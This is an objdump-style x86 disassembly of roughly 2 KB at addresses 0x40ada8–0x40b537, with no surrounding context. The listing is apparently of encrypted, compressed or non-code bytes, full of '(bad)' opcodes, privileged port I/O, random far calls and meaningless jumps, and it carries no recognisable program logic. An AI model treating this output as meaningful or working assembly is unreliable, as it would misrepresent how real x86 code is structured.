  40ada8:	inc    eax
  40ada9:	fsubr  DWORD PTR fs:[edx+0x5f]
  40adad:	mov    ah,0x73
  40adaf:	retf   0x9867
  40adb2:	jae    0x40addd
  40adb4:	outs   dx,DWORD PTR ds:[esi]
  40adb5:	js     0x40ae1d
  40adb7:	(bad)  
  40adb8:	jle    0x40ad56
  40adba:	sbb    DWORD PTR [edx-0x49fa1ad],0xb68692e
  40adc4:	inc    edi
  40adc5:	adc    DWORD PTR [edx-0x776f518],ebp
  40adcb:	mov    al,ds:0xb5042556
  40add0:	sub    ah,al
  40add2:	add    BYTE PTR [esi-0x3f],cl
  40add5:	and    bh,BYTE PTR [edi-0x2b]
  40add8:	cmp    bl,bh
  40adda:	lods   eax,DWORD PTR ds:[esi]
  40addb:	cwde   
  40addc:	stos   BYTE PTR es:[edi],al
  40addd:	ret    0xd2cf
  40ade0:	push   0xffffffb7
  40ade2:	dec    ebx
  40ade3:	sub    DWORD PTR [esp+ebp*2-0x45],ebx
  40ade7:	xlat   BYTE PTR ds:[ebx]
  40ade8:	jmp    0x40ae11
  40adea:	ins    DWORD PTR es:[edi],dx
  40adeb:	mov    ch,0x59
  40aded:	in     eax,0xf9
  40adef:	mov    eax,ds:0xcfd97b2a
  40adf4:	loopne 0x40ae70
  40adf6:	stos   DWORD PTR es:[edi],eax
  40adf7:	jl     0x40ae5b
  40adf9:	push   eax
  40adfa:	add    eax,0x158ba4bd
  40adff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae00:	leave  
  40ae01:	stos   BYTE PTR es:[edi],al
  40ae02:	jmp    FWORD PTR [ecx-0x4]
  40ae05:	bound  edx,QWORD PTR [ebx+0x6086d3f3]
  40ae0b:	das    
  40ae0c:	adc    eax,0xd2367147
  40ae11:	mov    eax,0x9bb073ae
  40ae16:	jns    0x40ae0b
  40ae18:	push   esp
  40ae19:	sub    ebx,DWORD PTR [ebp+0x196c14db]
  40ae1f:	and    eax,0xead7b1f5
  40ae24:	rol    dl,1
  40ae26:	add    bh,BYTE PTR [eax]
  40ae28:	xor    DWORD PTR [edi+0x5f61f5c2],ebx
  40ae2e:	call   0x1a5a:0x5d2bfd3b
  40ae35:	jp     0x40ae77
  40ae37:	test   al,0xfa
  40ae39:	mov    ebx,0xddd0acdc
  40ae3e:	add    al,BYTE PTR ds:0x9b6678c2
  40ae44:	push   eax
  40ae45:	(bad)  
  40ae46:	ins    DWORD PTR es:[edi],dx
  40ae47:	inc    BYTE PTR [esi+0x47]
  40ae4a:	inc    ebp
  40ae4b:	push   edx
  40ae4c:	int    0xcf
  40ae4e:	sub    BYTE PTR [esi],0x5d
  40ae51:	mov    edi,0x42bc1e49
  40ae56:	cmp    eax,0x3fada47c
  40ae5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae5c:	mov    gs,WORD PTR [esi+edx*4]
  40ae5f:	nop
  40ae60:	push   edi
  40ae61:	cmp    al,cl
  40ae63:	mov    ebx,0x8a5e3c4f
  40ae68:	aad    0x79
  40ae6a:	out    0x73,al
  40ae6c:	cwde   
  40ae6d:	mov    ?,WORD PTR [esi-0x44b5eca5]
  40ae73:	fldcw  WORD PTR ds:0x2c452b5
  40ae79:	gs inc eax
  40ae7b:	mov    ?,ebp
  40ae7d:	pop    ebp
  40ae7e:	mov    ecx,0x7ebdcbe3
  40ae83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae84:	lock inc ecx
  40ae86:	loopne 0x40ae78
  40ae88:	aaa    
  40ae89:	inc    ebp
  40ae8a:	jmp    0x40aea2
  40ae8c:	mov    BYTE PTR [ecx-0x13faee57],ch
  40ae92:	sub    eax,0x32f6092e
  40ae97:	jle    0x40aeb7
  40ae99:	mov    eax,0x60a64d7b
  40ae9e:	fcmovnbe st,st(4)
  40aea0:	mov    eax,ds:0xcea18ba6
  40aea5:	ror    BYTE PTR [edi],0x2a
  40aea8:	cli    
  40aea9:	add    DWORD PTR [edx],edx
  40aeab:	sar    BYTE PTR [edx-0xee44fdb],cl
  40aeb1:	pop    eax
  40aeb2:	in     al,dx
  40aeb3:	call   0xa28b:0x6d790fe4
  40aeba:	mov    esp,0xc765c1dd
  40aebf:	pop    esp
  40aec0:	out    0x25,al
  40aec2:	in     al,dx
  40aec3:	pop    eax
  40aec4:	push   edi
  40aec5:	shl    BYTE PTR ds:0x61c43550,0x30
  40aecc:	es (bad) 
  40aece:	cmc    
  40aecf:	push   ds
  40aed0:	pop    eax
  40aed1:	adc    esp,DWORD PTR [edi+0x4e0055bd]
  40aed7:	jno    0x40af04
  40aed9:	es fs push gs
  40aedd:	and    DWORD PTR [ebp+0x40],esp
  40aee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee1:	or     al,0xe5
  40aee3:	inc    edx
  40aee4:	leave  
  40aee5:	mov    edx,0x74c5beb4
  40aeea:	fwait
  40aeeb:	xor    BYTE PTR [ecx],0x66
  40aeee:	xor    dh,dl
  40aef0:	test   BYTE PTR [esi],ah
  40aef2:	hlt    
  40aef3:	push   es
  40aef4:	and    ebx,DWORD PTR [ebp+0x26]
  40aef7:	xchg   esi,eax
  40aef8:	daa    
  40aef9:	mov    edx,0x6d7f6d2
  40aefe:	fstp   DWORD PTR [ebp+edi*1-0x74d14442]
  40af05:	fnsave [edi+0x7e57b323]
  40af0b:	test   al,0x91
  40af0d:	ficom  DWORD PTR [ecx]
  40af0f:	cmp    DWORD PTR [eax+0x722d6e96],eax
  40af15:	jmp    0xd17f:0xf44b64e
  40af1c:	inc    edi
  40af1d:	push   es
  40af1e:	pop    eax
  40af1f:	or     dl,BYTE PTR [esi]
  40af21:	dec    ebx
  40af22:	aad    0x9a
  40af24:	jae    0x40af58
  40af26:	sub    ebp,DWORD PTR [edi+0x33]
  40af29:	lea    ebp,[eax+eax*8]
  40af2c:	(bad)  
  40af2d:	jge    0x40af7c
  40af2f:	mov    ebp,0x22d284bf
  40af34:	sub    bl,BYTE PTR [edx]
  40af36:	xchg   ebp,eax
  40af37:	mov    ah,0x55
  40af39:	inc    edi
  40af3a:	or     al,0xaf
  40af3c:	cmp    esp,ebx
  40af3e:	mov    ecx,0x3df30c74
  40af43:	sti    
  40af44:	mov    esp,DWORD PTR [ebp-0x70]
  40af47:	inc    eax
  40af48:	cmp    BYTE PTR [eax+0x76],bl
  40af4b:	mov    ch,0xed
  40af4d:	test   DWORD PTR [edx+0x5a1b9717],esp
  40af53:	pop    edi
  40af54:	(bad)  
  40af55:	jns    0x40af6e
  40af57:	gs pop ebp
  40af59:	pop    edx
  40af5a:	repz loope 0x40afa3
  40af5d:	sbb    eax,0x847240a3
  40af62:	frstor [esi+edi*4-0x9]
  40af66:	xor    DWORD PTR [edx+0x1c55dc14],ebx
  40af6c:	sbb    DWORD PTR [eax],0x40a2bfaa
  40af72:	lahf   
  40af73:	cmp    ch,cl
  40af75:	jne    0x40afbc
  40af77:	test   eax,0x4e094dd3
  40af7c:	jnp    0x40affb
  40af7e:	fadd   DWORD PTR [ebx+0x2d]
  40af81:	repnz adc eax,0x518b9a4
  40af87:	in     al,0x11
  40af89:	pop    ss
  40af8a:	dec    ebp
  40af8b:	push   ebp
  40af8c:	pop    edi
  40af8d:	pop    edx
  40af8e:	lods   al,BYTE PTR ds:[esi]
  40af8f:	fiadd  DWORD PTR [ecx-0x3c527e6]
  40af95:	rcl    DWORD PTR [eax+0x5f],1
  40af98:	mov    BYTE PTR [eax-0x3d911704],dl
  40af9e:	push   esp
  40af9f:	popa   
  40afa0:	call   0xaf70:0xfa145f6a
  40afa7:	fwait
  40afa8:	sbb    ah,BYTE PTR [eax+ebx*1]
  40afab:	ja     0x40af61
  40afad:	out    0x8b,eax
  40afaf:	test   al,0x1b
  40afb1:	xchg   edx,eax
  40afb2:	ss push ecx
  40afb4:	push   eax
  40afb5:	in     al,dx
  40afb6:	repnz pushf 
  40afb8:	inc    esp
  40afb9:	nop
  40afba:	mov    ch,0xe9
  40afbc:	sub    ebp,DWORD PTR [esp+eax*4-0x20938aef]
  40afc3:	lock dec esi
  40afc5:	xchg   BYTE PTR [ecx],dl
  40afc7:	mov    eax,ds:0x343ef1e1
  40afcc:	stos   DWORD PTR es:[edi],eax
  40afcd:	lea    esi,[ebx-0x37]
  40afd0:	cmp    al,0x16
  40afd2:	add    al,0x5c
  40afd4:	xchg   BYTE PTR [eax+0x69029b0],bh
  40afda:	mov    al,ds:0xaf242a30
  40afdf:	and    al,0xaf
  40afe1:	stc    
  40afe2:	jo     0x40b031
  40afe4:	int    0x1c
  40afe6:	jb     0x40af83
  40afe8:	jle    0x40b014
  40afea:	jmp    0xb53561ee
  40afef:	or     cl,bl
  40aff1:	dec    esi
  40aff2:	imul   DWORD PTR [ecx+0x67]
  40aff5:	into   
  40aff6:	inc    ebp
  40aff7:	and    DWORD PTR [edx+0x33f7fceb],ebx
  40affd:	and    BYTE PTR [eax-0x5816f4cb],cl
  40b003:	push   ebx
  40b004:	cwde   
  40b005:	sbb    DWORD PTR [edx],0xd9930e62
  40b00b:	and    al,0x1d
  40b00d:	inc    ebp
  40b00e:	in     al,0xdb
  40b010:	ins    DWORD PTR es:[edi],dx
  40b011:	jae    0x40afed
  40b013:	xchg   BYTE PTR [edi+0x38],ah
  40b016:	(bad)  
  40b017:	sti    
  40b018:	inc    edi
  40b019:	fnsave [esi]
  40b01b:	push   esi
  40b01c:	dec    edx
  40b01d:	retf   0xb182
  40b020:	test   al,0x21
  40b022:	cmp    DWORD PTR [edx-0x38a06656],edx
  40b028:	jge    0x40afd0
  40b02a:	mov    dh,0xcc
  40b02c:	add    BYTE PTR [eax],bh
  40b02e:	mov    esp,0x5504d7b
  40b033:	les    eax,FWORD PTR [esi-0x1c]
  40b036:	jne    0x40b000
  40b038:	or     al,0x54
  40b03a:	out    0x52,al
  40b03c:	or     eax,0x59825e7
  40b041:	or     ch,BYTE PTR [edx-0x1]
  40b044:	test   DWORD PTR [esi],ebx
  40b046:	sub    eax,0x10b51541
  40b04b:	repnz or eax,0x98740760
  40b051:	addr16 push ecx
  40b053:	cs pop esi
  40b055:	ficom  WORD PTR [edx]
  40b057:	jb     0x40b049
  40b059:	lods   eax,DWORD PTR ds:[esi]
  40b05a:	pushf  
  40b05b:	stos   DWORD PTR es:[edi],eax
  40b05c:	lods   al,BYTE PTR ds:[esi]
  40b05d:	jmp    0x684bb6f9
  40b062:	sub    al,0x16
  40b064:	call   FWORD PTR [eax+0x2f]
  40b067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b068:	imul   ebx,DWORD PTR [esi+0x3e25fd8c],0xf1aa6a99
  40b072:	jge    0x40b0a5
  40b074:	and    cl,bl
  40b076:	and    eax,0x27accb09
  40b07b:	push   0xffffffa8
  40b07d:	ror    DWORD PTR [edi+0x6],0xd3
  40b081:	test   eax,0xc15bd2ef
  40b086:	cmp    DWORD PTR [ebp+0x3e],ebx
  40b089:	fisttp QWORD PTR [ebp-0x27fbd5a3]
  40b08f:	pop    ds
  40b090:	sub    eax,0xa4893429
  40b095:	mov    edx,0xbbf31ac8
  40b09a:	and    eax,0x475bccf6
  40b0a0:	inc    ecx
  40b0a1:	std    
  40b0a2:	inc    ebx
  40b0a3:	cmp    eax,0x6fb1d834
  40b0a8:	inc    edi
  40b0a9:	mov    esp,0xb7e45ab0
  40b0ae:	xor    al,0x95
  40b0b0:	or     eax,0x58718615
  40b0b5:	das    
  40b0b6:	xchg   bl,al
  40b0b8:	xor    BYTE PTR [esi+edx*2-0x7c],dh
  40b0bc:	push   cs
  40b0bd:	mov    ds:0x335a2e0f,al
  40b0c2:	mov    bl,0x2
  40b0c4:	fnstcw WORD PTR ds:0x31395348
  40b0ca:	arpl   WORD PTR [edi+0x77],di
  40b0cd:	mov    ds:0x78e3cd5,al
  40b0d2:	push   0x63
  40b0d4:	shl    ebx,cl
  40b0d6:	pop    eax
  40b0d7:	out    0xc6,al
  40b0d9:	inc    eax
  40b0da:	sbb    ah,BYTE PTR [edx]
  40b0dc:	dec    edi
  40b0dd:	out    dx,al
  40b0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0df:	adc    bh,BYTE PTR [esi-0x5d]
  40b0e2:	retf   0x3ea0
  40b0e5:	jae    0x40b0cf
  40b0e7:	pop    eax
  40b0e8:	scas   al,BYTE PTR es:[edi]
  40b0e9:	cmp    al,0xae
  40b0eb:	sbb    bh,BYTE PTR [ebx+0x6]
  40b0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ef:	push   ebp
  40b0f0:	(bad)  
  40b0f1:	lods   eax,DWORD PTR ds:[esi]
  40b0f2:	pop    ds
  40b0f3:	pop    ebp
  40b0f4:	mov    edi,0x73fc061b
  40b0f9:	xchg   edi,eax
  40b0fa:	gs int 0xa9
  40b0fd:	arpl   WORD PTR [ecx+0x40e75e21],ax
  40b103:	sub    edi,DWORD PTR [esi-0x41306cb7]
  40b109:	xor    eax,0x71072c33
  40b10e:	jmp    0x40b0c3
  40b110:	or     eax,DWORD PTR [ebx+0x3c]
  40b113:	js     0x40b097
  40b115:	mov    dl,0x2d
  40b117:	mov    edi,0x23a2ea8d
  40b11c:	stc    
  40b11d:	mov    edi,0x5c7f1f8c
  40b122:	push   ss
  40b123:	les    edi,FWORD PTR [esi]
  40b125:	mov    ecx,0xfca40044
  40b12a:	call   0x49013960
  40b12f:	sbb    BYTE PTR es:[edx],0xc6
  40b133:	cmp    ebx,0x39ec54fb
  40b139:	dec    ebp
  40b13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b13b:	scas   eax,DWORD PTR es:[edi]
  40b13c:	mov    ah,0x8c
  40b13e:	push   cs
  40b13f:	repnz xor bh,BYTE PTR [edx-0x5d3d7d2]
  40b146:	mov    ebx,0x12cef51b
  40b14b:	push   0x29
  40b14d:	js     0x40b1a7
  40b14f:	xchg   ebx,eax
  40b150:	xor    al,0xa
  40b152:	inc    edi
  40b153:	and    eax,0x92dcaa78
  40b158:	in     eax,0x20
  40b15a:	cld    
  40b15b:	fisubr WORD PTR [esi]
  40b15d:	push   edi
  40b15e:	int3   
  40b15f:	rcr    DWORD PTR [ebp+ecx*4-0x2dfaf403],cl
  40b166:	xor    dh,BYTE PTR [edi+0x14]
  40b169:	iret   
  40b16a:	xchg   edx,eax
  40b16b:	or     al,0x83
  40b16d:	push   0xb02b3c3e
  40b172:	xchg   BYTE PTR [ecx+0x27d4bd93],cl
  40b178:	xor    al,0x4c
  40b17a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b17b:	je     0x40b137
  40b17d:	mov    gs,WORD PTR [eax]
  40b17f:	jns    0x40b1de
  40b181:	mov    edi,0x464ed5db
  40b186:	inc    edi
  40b187:	lods   al,BYTE PTR ds:[esi]
  40b188:	push   esp
  40b189:	inc    esi
  40b18a:	ret    
  40b18b:	out    0x36,al
  40b18d:	ds jmp 0x40b1ac
  40b190:	aas    
  40b191:	rcr    BYTE PTR [esi],1
  40b193:	push   ebp
  40b194:	adc    BYTE PTR [ecx],bl
  40b196:	jmp    0x5c13ae73
  40b19b:	push   es
  40b19c:	in     al,dx
  40b19d:	jmp    ebp
  40b19f:	and    bh,bl
  40b1a1:	(bad)  
  40b1a2:	pop    ecx
  40b1a3:	adc    bl,BYTE PTR [ebp-0x2e998251]
  40b1a9:	mov    eax,ds:0x19c1524
  40b1ae:	test   DWORD PTR [ecx+0x48],0x1e95fa1c
  40b1b5:	gs mov esp,0x831b90b8
  40b1bb:	push   0x5c
  40b1bd:	push   edx
  40b1be:	adc    ebx,edx
  40b1c0:	fstp   TBYTE PTR [eax]
  40b1c2:	cmp    al,0xe8
  40b1c4:	scas   eax,DWORD PTR es:[edi]
  40b1c5:	(bad)  
  40b1c6:	adc    DWORD PTR [eax+eax*8],ebx
  40b1c9:	add    eax,0x87948d26
  40b1ce:	shl    DWORD PTR [esi-0x5335c74b],0xf2
  40b1d5:	div    DWORD PTR [edx+0x76]
  40b1d8:	(bad)  
  40b1d9:	bound  ebx,QWORD PTR [edi]
  40b1db:	add    eax,DWORD PTR [edx]
  40b1dd:	mov    ebp,0xf40af02a
  40b1e2:	jle    0x40b16e
  40b1e4:	lock adc BYTE PTR [esi],0xac
  40b1e8:	fcom   QWORD PTR [edx+0x6e]
  40b1eb:	cmp    BYTE PTR [edx-0x63],0x8b
  40b1ef:	mov    esp,0xfd7308d7
  40b1f4:	es in  eax,dx
  40b1f6:	xchg   ebp,eax
  40b1f7:	enter  0x6701,0x4b
  40b1fb:	lahf   
  40b1fc:	das    
  40b1fd:	(bad)  
  40b1fe:	sbb    ch,ch
  40b200:	adc    esi,DWORD PTR [esi-0xe]
  40b203:	mov    WORD PTR [ecx],es
  40b205:	mov    ah,0x4
  40b207:	dec    edx
  40b208:	test   BYTE PTR [edx+esi*4+0x22f05277],ah
  40b20f:	mov    ecx,0x3f2c45cf
  40b214:	(bad)  
  40b215:	mov    edi,0x249b501f
  40b21a:	fdiv   DWORD PTR [edx]
  40b21c:	jge    0x40b226
  40b21e:	repnz int 0x26
  40b221:	inc    ecx
  40b222:	(bad)  
  40b223:	pop    ss
  40b224:	push   0xd
  40b226:	out    0x3b,eax
  40b228:	out    0x19,eax
  40b22a:	lods   al,BYTE PTR ds:[esi]
  40b22b:	mov    cl,0x3d
  40b22d:	loopne 0x40b233
  40b22f:	jns    0x40b297
  40b231:	mov    DWORD PTR [ebx],ecx
  40b233:	std    
  40b234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b235:	(bad)  
  40b236:	stos   DWORD PTR es:[edi],eax
  40b237:	pop    ss
  40b238:	shl    cl,cl
  40b23a:	jmp    0xd084e6c3
  40b23f:	or     BYTE PTR [eax+0x7],bh
  40b242:	mov    dh,0x2b
  40b244:	adc    BYTE PTR [esi+edx*1+0x340d94af],al
  40b24b:	inc    ebp
  40b24c:	mov    esi,0x42f1b630
  40b251:	mov    DWORD PTR [ebx+0x45],eax
  40b254:	fdivp  st(7),st
  40b256:	mov    ebx,0xa02684e3
  40b25b:	cmp    BYTE PTR [bx+di+0x3f6a],ah
  40b260:	or     edx,DWORD PTR [ebx]
  40b262:	shl    eax,1
  40b264:	adc    ch,cl
  40b266:	mov    cl,0x88
  40b268:	lahf   
  40b269:	and    ch,BYTE PTR [ecx-0x63]
  40b26c:	mov    ds:0x4d2da660,eax
  40b271:	outs   dx,DWORD PTR ds:[esi]
  40b272:	mov    esp,0x5b79f927
  40b277:	icebp  
  40b278:	xchg   ebp,eax
  40b279:	sbb    ecx,DWORD PTR [esi]
  40b27b:	out    0x6,eax
  40b27d:	xchg   ebp,esi
  40b27f:	cmp    al,0xcc
  40b281:	sub    dl,bh
  40b283:	xchg   esp,eax
  40b284:	je     0x40b24c
  40b286:	mov    dl,0x16
  40b288:	in     al,dx
  40b289:	adc    BYTE PTR [eax],ch
  40b28b:	aam    0x0
  40b28d:	or     BYTE PTR [edi-0x20],cl
  40b290:	adc    ebx,edx
  40b292:	xchg   ecx,eax
  40b293:	in     eax,dx
  40b294:	jp     0x40b232
  40b296:	std    
  40b297:	in     al,0x58
  40b299:	mov    ecx,0x5a7b3a5c
  40b29e:	inc    edx
  40b29f:	mov    esp,0xda25b086
  40b2a4:	mov    ebp,0xc94ca835
  40b2a9:	jno    0x40b2d2
  40b2ab:	inc    edx
  40b2ac:	pop    ebx
  40b2ad:	clc    
  40b2ae:	inc    edi
  40b2af:	inc    edx
  40b2b0:	loop   0x40b23f
  40b2b2:	gs sbb eax,0xfdee83a9
  40b2b8:	adc    esp,0x3a
  40b2bb:	dec    esi
  40b2bc:	imul   eax,DWORD PTR [edx+0x53cabbf3],0x6f
  40b2c3:	sub    DWORD PTR [esp+ebx*4+0x6f],edx
  40b2c7:	je     0x40b26a
  40b2c9:	test   ebx,0x6774bef7
  40b2cf:	mov    dh,0x27
  40b2d1:	mov    BYTE PTR [eax+eiz*8+0x333e37c7],al
  40b2d8:	(bad)  
  40b2d9:	out    0x54,al
  40b2db:	sbb    ebp,DWORD PTR [ecx-0x22]
  40b2de:	retf   
  40b2df:	fucomip st,st(3)
  40b2e1:	les    ebx,FWORD PTR [edi+0x67]
  40b2e4:	stc    
  40b2e5:	and    eax,0x21dd1335
  40b2ea:	stc    
  40b2eb:	add    al,0xea
  40b2ed:	bound  eax,QWORD PTR ds:0xdd29e044
  40b2f3:	sar    edi,cl
  40b2f5:	cli    
  40b2f6:	mov    cl,0x16
  40b2f8:	and    ch,dh
  40b2fa:	repz push ebp
  40b2fc:	push   ebx
  40b2fd:	ja     0x40b27f
  40b2ff:	imul   ebx,DWORD PTR [ebx+eax*8-0x62],0xe75e8bff
  40b307:	lahf   
  40b308:	sbb    esp,DWORD PTR [ebp-0x199e36fd]
  40b30e:	mov    dh,0x49
  40b310:	push   cs
  40b311:	outs   dx,BYTE PTR ds:[esi]
  40b312:	int    0xa5
  40b314:	(bad)  
  40b315:	pop    edi
  40b316:	push   cs
  40b317:	or     eax,0xc6974f8f
  40b31c:	xor    ebp,DWORD PTR [edi]
  40b31e:	jnp    0x40b383
  40b320:	jne    0x40b306
  40b322:	ins    DWORD PTR es:[edi],dx
  40b323:	fnstsw WORD PTR [edi]
  40b325:	inc    ecx
  40b326:	mov    dl,0x75
  40b328:	adc    eax,0x2423ad2d
  40b32d:	sub    DWORD PTR [ebx],ecx
  40b32f:	repnz enter 0xa023,0x23
  40b334:	lods   al,BYTE PTR ds:[esi]
  40b335:	retf   
  40b336:	scas   al,BYTE PTR es:[edi]
  40b337:	mov    ds:0xcfdba21c,al
  40b33c:	sbb    bl,ch
  40b33e:	int3   
  40b33f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b340:	inc    ecx
  40b341:	or     BYTE PTR [eax],ch
  40b343:	cwde   
  40b344:	inc    edi
  40b345:	mov    esp,0xdfc1d6dd
  40b34a:	dec    eax
  40b34b:	or     al,0x9b
  40b34d:	fs rcr dl,0xa
  40b351:	js     0x40b374
  40b353:	pushf  
  40b354:	stos   BYTE PTR es:[edi],al
  40b355:	push   ss
  40b356:	jb     0x40b373
  40b358:	push   ebp
  40b359:	ficom  DWORD PTR [esp+esi*8+0x11]
  40b35d:	retf   
  40b35e:	or     DWORD PTR [edi+0x7e219f98],edx
  40b364:	push   ds
  40b365:	int    0xf9
  40b367:	fsub   DWORD PTR [ecx-0x5a827fb6]
  40b36d:	jmp    0x40b329
  40b36f:	sbb    al,0x4e
  40b371:	cmp    ebx,DWORD PTR [ebx+0x5f]
  40b374:	inc    esp
  40b375:	lds    eax,FWORD PTR [eax]
  40b377:	mov    ch,BYTE PTR [ebp-0x6de274ab]
  40b37d:	cs (bad) 
  40b37f:	(bad)  
  40b381:	jae    0x40b305
  40b383:	add    bl,BYTE PTR [edx+0x405ac8a6]
  40b389:	lahf   
  40b38a:	xchg   esi,eax
  40b38b:	test   BYTE PTR [esi+0xd],0x8f
  40b38f:	xlat   BYTE PTR ds:[ebx]
  40b390:	cmp    dh,BYTE PTR [ebp+0x62]
  40b393:	xchg   edx,eax
  40b394:	adc    BYTE PTR [edi+ecx*4+0x6a],0x61
  40b399:	sub    DWORD PTR [esi-0x78],eax
  40b39c:	inc    ebp
  40b39d:	mov    dh,0xc4
  40b39f:	(bad)  [ebx]
  40b3a1:	(bad)  [esi]
  40b3a3:	cmp    ebp,DWORD PTR [eax]
  40b3a5:	sbb    DWORD PTR [eax],eax
  40b3a7:	mov    bh,0xd
  40b3a9:	cmc    
  40b3aa:	outs   dx,DWORD PTR ds:[esi]
  40b3ab:	in     eax,dx
  40b3ac:	stc    
  40b3ad:	call   0x62a344e3
  40b3b2:	sbb    DWORD PTR [esi],0xad314d91
  40b3b8:	pop    ds
  40b3b9:	out    dx,al
  40b3ba:	popa   
  40b3bb:	rol    DWORD PTR [edx+edi*1-0x3e368193],0x3a
  40b3c3:	and    DWORD PTR [edx-0xbd00778],ecx
  40b3c9:	dec    edx
  40b3ca:	add    DWORD PTR [ebp+0x17],edx
  40b3cd:	push   ebp
  40b3ce:	int    0x5e
  40b3d0:	bound  esp,QWORD PTR [eax]
  40b3d2:	xor    eax,0x82e38668
  40b3d7:	out    dx,eax
  40b3d8:	xor    al,0x47
  40b3da:	iret   
  40b3db:	iret   
  40b3dc:	pop    esp
  40b3dd:	cmp    bh,BYTE PTR [ecx]
  40b3df:	hlt    
  40b3e0:	inc    edx
  40b3e1:	adc    eax,0x3662575d
  40b3e6:	ficomp WORD PTR [ebp+0x21]
  40b3e9:	mov    al,ds:0xf087a4b5
  40b3ee:	(bad)  
  40b3ef:	dec    esi
  40b3f0:	test   eax,0x77e01965
  40b3f5:	xchg   esp,eax
  40b3f6:	xchg   ebp,eax
  40b3f7:	or     esp,DWORD PTR [edx+0x1c]
  40b3fa:	sub    eax,0x8d0e3770
  40b3ff:	fsubr  st,st(3)
  40b401:	pop    ds
  40b402:	nop
  40b403:	shl    BYTE PTR [eax-0x76fb5123],1
  40b409:	in     al,dx
  40b40a:	mov    edx,0x706a30f5
  40b40f:	pop    edx
  40b410:	and    dh,bl
  40b412:	pop    ebp
  40b413:	mov    cl,0x3f
  40b415:	outs   dx,DWORD PTR ds:[esi]
  40b416:	addr16 or al,0x8b
  40b419:	pop    eax
  40b41a:	das    
  40b41b:	dec    edi
  40b41c:	lods   eax,DWORD PTR cs:[esi]
  40b41e:	xor    al,0x90
  40b420:	mov    ds:0xb831cb07,al
  40b425:	test   al,0x89
  40b427:	call   0xe38e:0x8bc0cd48
  40b42e:	(bad)  
  40b42f:	dec    esi
  40b430:	and    al,0x21
  40b432:	shr    BYTE PTR [edi+0x53],0x6b
  40b436:	pop    es
  40b437:	mov    eax,ds:0x7d9d0677
  40b43c:	adc    DWORD PTR ds:0x8f3b2f9c,esi
  40b442:	mov    bx,0x201
  40b446:	push   0x979d0a49
  40b44b:	bound  esi,QWORD PTR [ebp-0x29]
  40b44e:	jge    0x40b490
  40b450:	push   esp
  40b451:	lock fsub QWORD PTR [eax]
  40b454:	pop    esi
  40b455:	clc    
  40b456:	clc    
  40b457:	retf   
  40b458:	cs sti 
  40b45a:	dec    ebp
  40b45b:	dec    eax
  40b45c:	xor    eax,0x4a7c274e
  40b461:	sahf   
  40b462:	test   al,0x68
  40b464:	cmc    
  40b465:	cmp    edx,DWORD PTR [ebx]
  40b467:	pop    ebx
  40b468:	adc    dh,bl
  40b46a:	scas   al,BYTE PTR es:[edi]
  40b46b:	dec    eax
  40b46c:	call   0x408545ba
  40b471:	xchg   edx,eax
  40b472:	sbb    esi,edi
  40b474:	les    edx,FWORD PTR [ebx+0x49]
  40b477:	cmp    ch,BYTE PTR [esi-0x3d3510dc]
  40b47d:	(bad)  
  40b47e:	js     0x40b4c9
  40b480:	fisubr DWORD PTR [ebx-0x49]
  40b483:	stos   BYTE PTR es:[edi],al
  40b484:	mov    ebp,0xbef0ae20
  40b489:	in     eax,0xa4
  40b48b:	and    eax,0x380123d7
  40b490:	fidivr WORD PTR [esi]
  40b492:	loop   0x40b47c
  40b494:	daa    
  40b495:	rcl    DWORD PTR [ebp-0x1e],0x7f
  40b499:	(bad)  
  40b49a:	retf   0xd37e
  40b49d:	mov    bl,0x5
  40b49f:	jo     0x40b436
  40b4a1:	or     bl,BYTE PTR [edi+eiz*4+0xf]
  40b4a5:	or     ah,al
  40b4a7:	(bad)  
  40b4a8:	fist   DWORD PTR [ebx]
  40b4aa:	out    0x69,al
  40b4ac:	sbb    DWORD PTR [eax+edx*4],0x21
  40b4b0:	lock inc ecx
  40b4b2:	sub    bl,al
  40b4b4:	mov    al,ds:0x605a1356
  40b4b9:	jmp    0x240e:0xa30af8d6
  40b4c0:	fiadd  DWORD PTR [ebp-0xc]
  40b4c3:	pop    eax
  40b4c4:	pop    es
  40b4c5:	xchg   esp,eax
  40b4c6:	arpl   ax,bx
  40b4c8:	les    eax,FWORD PTR [ebp+0x6ff33c2e]
  40b4ce:	cmp    al,0xcc
  40b4d0:	adc    ch,BYTE PTR [esi-0x11]
  40b4d3:	xor    bl,BYTE PTR [ebp-0x13]
  40b4d6:	adc    DWORD PTR [edi-0x314110a6],edi
  40b4dc:	dec    BYTE PTR [edx]
  40b4de:	xchg   ebp,eax
  40b4df:	push   ecx
  40b4e1:	iret   
  40b4e2:	repz mov ds:0x2472a3d,eax
  40b4e8:	mov    ds:0xe6b792b1,al
  40b4ed:	ins    BYTE PTR es:[edi],dx
  40b4ee:	lea    esi,[ebp+0x6e]
  40b4f1:	inc    edi
  40b4f2:	mov    BYTE PTR [eax+edx*4+0x5d2099b2],al
  40b4f9:	inc    edi
  40b4fa:	push   edx
  40b4fb:	sbb    al,0x75
  40b4fd:	nop
  40b4fe:	sti    
  40b4ff:	in     al,dx
  40b500:	sbb    BYTE PTR [ecx+0x45],dh
  40b503:	lock jne 0x40b53b
  40b506:	cmp    BYTE PTR [ebx+0x2c],dh
  40b509:	ins    DWORD PTR es:[edi],dx
  40b50a:	aad    0x18
  40b50c:	in     al,dx
  40b50d:	mov    ds:0xb4f2eff7,al
  40b512:	icebp  
  40b513:	ss push ecx
  40b515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b516:	sub    eax,0x7ffe478a
  40b51b:	jbe    0x40b542
  40b51d:	pusha  
  40b51e:	mov    ecx,0xe36ea060
  40b523:	push   edx
  40b524:	dec    esi
  40b525:	xor    esi,DWORD PTR ds:0xd09ec955
  40b52b:	into   
  40b52c:	cmp    DWORD PTR [ebx-0x2c505797],edi
  40b532:	icebp  
  40b533:	in     eax,dx
  40b534:	int3   
  40b535:	cli    
  40b536:	pop    edx
  40b537:	lods   eax,DWORD PTR ds:[esi]
